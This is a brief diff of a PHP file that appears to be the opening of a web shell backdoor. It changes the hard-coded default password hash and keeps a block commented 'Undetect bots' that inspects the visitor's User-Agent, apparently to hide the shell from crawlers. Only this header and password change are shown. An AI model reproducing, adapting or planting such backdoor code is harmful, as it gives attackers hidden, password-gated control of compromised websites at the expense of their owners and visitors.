@@ -1,7 +1,7 @@
 <?php
 session_start();
 define('APP_VER', '0.8');
-$password = defined('PW') ? PW : 'b45cffe084dd3d20d928bee85e7b0f21';
+$password = defined('PW') ? PW : 'ab2b997048cfdac1d7de16aeeff66b9b';
 
 // Undetect bots
 if (!empty($_SERVER['HTTP_USER_AGENT'])) {
